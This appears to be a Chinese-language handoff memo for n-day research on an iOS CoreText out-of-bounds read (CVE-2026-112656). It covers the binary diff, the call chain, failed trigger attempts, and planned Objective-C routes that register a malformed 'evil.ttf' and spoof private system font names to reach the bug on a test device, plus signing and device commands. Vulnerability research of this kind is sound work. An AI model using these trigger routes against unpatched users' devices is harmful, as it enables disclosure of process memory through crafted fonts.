# 交接：CoreText 光学尺寸越界读（CVE-2026-112656）—— 可达性验证与 PoC

> 这是目前所有线索中质量最高的一条：**有实质代码改动 + 有对应 CVE + 入口唯一且已定位**。
> 唯一未验证的是「app 沙盒内能否走到该入口」。

---

## 一、已确认的事实（不需要重做）

### 1. 函数差分
```
TFont::SelectOpticalStyleFromOS2
  27.0.1: 299 条指令   0x19a30b73c
  27.2:   886 条指令   0x19a4ac9d0     ← 3 倍增长
  新增比较/条件跳转: +71
```
静态全局扫描（4689 个 dylib、15278 个候选）中，这是**唯一同时满足
「解析不可信数据 + 大幅新增校验 + 有 CVE 对应」的函数**。

### 2. 对应 CVE
**CVE-2026-112656**（CoreText）
> "Processing a maliciously crafted font may result in the disclosure of process memory"
> "An out-of-bounds read was addressed with improved bounds checking."

### 3. 调用链（已逆出，唯一入口）
```
TFont::SetOpticalSize(__CTFontDescriptor const*)     ← 唯一调用者
     0x19a2574e4  bl
     0x19a2577cc  bl
   └─→ TFont::SelectOpticalStyleFromOS2
另有一处数据段指针引用（可能是 vtable 项）
```

### 4. 27.0.1 的关键代码形态
```asm
bl   <取表>                       ; 取 OS/2 表
adrp x1, #...; add x1, x1, #0xff8
mov  w2, #4
bl   <GetTable(tag, 4)>           ; 拿到表指针 + 长度
cbz  x1, <退出>
add  x2, x0, x1                   ; table_end = base + len
...
fcmp d1, d0 ; b.hi / b.mi / b.eq  ; 比较两个光学尺寸
```
对应 OS/2 **version 5** 的 `usLowerOpticalPointSize`（偏移 92）/ `usUpperOpticalPointSize`（94）。

**假设**：声明 version=5 但表实际长度 < 96 字节 → 读到表尾之外。

---

## 二、已经试过且失败的（**不要重复**）

| 尝试 | 规模 | 结果 |
|---|---|---|
| `CTFontCreateWithGraphicsFont(cg, size, NULL, NULL)` + Apple Symbols 基底 | 15 字体 × 10 字号 | 全部正常 |
| 同上，改用 **SFNS.ttf**（真 opsz 轴 17–96）做基底 | 5 字体 × 9 字号 | 全部正常 |
| 加 `kCTFontOpticalSizeAttribute` 描述符 | 同上 | 全部正常 |
| 加 `kCTFontVariationAttribute{opsz}` 描述符 | 同上 | 全部正常 |

**共 142 行日志，零崩溃。**

**根因判断**：`TFont::SetOpticalSize` 只在**系统字体匹配**时调用；
从 data provider 直接造 `CGFont` 不经过匹配，所以到不了目标函数。

---

## 三、下一步要做的（核心任务）

### 路线 A：注册 + 按名解析（首选）
```objc
// 1. 把恶意字体写到沙盒目录
NSString *dst = [NSTemporaryDirectory() stringByAppendingPathComponent:@"evil.ttf"];
[data writeToFile:dst atomically:YES];

// 2. 注册进 app 字体域
CFErrorRef err=NULL;
CTFontManagerRegisterFontsForURL((__bridge CFURLRef)[NSURL fileURLWithPath:dst],
                                 kCTFontManagerScopeProcess, &err);

// 3. 取出 PostScript 名 / 族名
CGDataProviderRef dp = CGDataProviderCreateWithCFData((__bridge CFDataRef)data);
CGFontRef cg = CGFontCreateWithDataProvider(dp);
CFStringRef psName = CGFontCopyPostScriptName(cg);

// 4. ★ 按名解析 —— 这一步才走字体匹配，触发 SetOpticalSize
CTFontRef f = CTFontCreateWithName(psName, size, NULL);
// 再 CTFontGetAscent/Descent/CapHeight + CTFontDrawGlyphs + CTFontGetBoundingRectsForGlyphs
```
字号要扫 `[lower, upper]` 内外：`1, 8, 16, 17, 20, 28, 64, 96, 200`

### 路线 B：诱导系统字体匹配
伪造私有族名（如 `.SFNS-Regular` / `.AppleSystemUIFont`）让 CoreText 认为
它是系统字体的光学变体，强制走 SetOpticalSize。

### 路线 C：若 A/B 都不行
说明该函数在 iOS 27 的 app 可达面确实封闭，
**把结论写成"不可达"交付**（与 FontParser 那条同样的处理方式）。

---

## 四、环境与工具

### 镜像数据（已就绪，不要重新解密）
```
27.0.1 用户态 dylib：/tmp/dsc/ios2701/
27.2   用户态 dylib：/tmp/dsc/ios272/
27.0.1 内核：out/kc.27.0.1.full     27.2 内核：out/kernelcache.27.2.ga
```
（若 /tmp 被清空，用 `tools/aea_unlock.py` + `dsc_extractor` 重建，
见 `out/USERSPACE-ACQUISITION.md`）

### 反汇编工具
```bash
# 单函数双版本对比
python3 /tmp/udiff.py <A.dylib> <B.dylib> 0x19a30b73c 0x19a4ac9d0
# 找调用者（Cross-reference）
python3 tools/xref.py <dylib> 0x19a30b73c
# 全局扫描（已完成，结果在 out/scan_all.jsonl）
```

### 字体构造（已有现成脚本）
```
harness/fontpoc/makeos2.py     Apple Symbols 基底，OS/2 版本/长度/取值畸形
harness/fontpoc/makeos2b.py    SFNS（真 opsz 轴）基底，同上
产物：harness/fontpoc/os2/ 与 harness/fontpoc/os2b/
```

### 真机
```
设备: iPhone18,2 / iOS 27.0.1 (24A446)
devicectl id : DEVICE-UDID
pymobiledevice3 udid: 00008150-000654600A00C01C
bundle id    : com.example.ios27poc   （显式 App ID，无法更换；当前没有别人在用）
描述文件     : <HOME>/Downloads/profile.mobileprovision
entitlements : /tmp/ents.plist
签名身份     : "iPhone Distribution: <DEVELOPER> (<TEAMID>)"
```

**签名前必须做**（否则静默失败，报 `No code signature found 0xe800801c`）：
```bash
security unlock-keychain -p "" ~/Library/Keychains/dev.keychain-db
security set-key-partition-list -S apple-tool:,apple:,codesign: -s -k "" ~/Library/Keychains/dev.keychain-db
codesign -s "iPhone Distribution: <DEVELOPER> (<TEAMID>)" \
  --keychain ~/Library/Keychains/dev.keychain-db \
  --entitlements /tmp/ents.plist --generate-entitlement-der -f <app>
codesign -dvvv <app> | grep Identifier     # 必须能打印出来才算签成功
```

**设备交互**
```bash
DEV=DEVICE-UDID
xcrun devicectl device install app --device $DEV <app绝对路径>
xcrun devicectl device process launch --device $DEV com.example.ios27poc
xcrun devicectl device copy from --device $DEV --domain-type appDataContainer \
  --domain-identifier com.example.ios27poc --source tmp/x.log --destination /tmp/x.log
```
- **设备锁屏时无法 install/launch**（报 `BSErrorCodeDescription = Locked`），需人工解锁
- app 沙盒内 `/tmp` 不可写，日志必须用 `getenv("TMPDIR")` 或 `NSTemporaryDirectory()`
- 现有测试 app 框架可复用：`harness/fontpoc/`（`main.m` + `Payload/FP.app`）

---

## 五、判读标准

| 观察 | 含义 |
|---|---|
| app 崩溃 / 被 SIGKILL | **PoC 成功**，保存输入 + 崩溃日志 |
| 字体注册返回错误 | 注册路径被封，改试路线 B |
| 全部正常完成 | 走路线 C，交付「不可达」结论 |

无论哪种结果都要写进 `out/STATIC-ANALYSIS-CORETEXT.md`，并附实测日志。

---

## 六、项目整体背景（供理解，不必重做）
- 全部已确认发现与已否证路径见 `out/SESSION-STATUS.md`
- 全量扫描结果见 `out/SCAN-ALL-RESULTS.md`
- 用户态分析流水线见 `out/USERSPACE-DIFF-RESULTS.md`
- 内核侧结论见 `out/NETPATH-ANALYSIS.md`、`out/KEXT-DIFF-FULL.md`
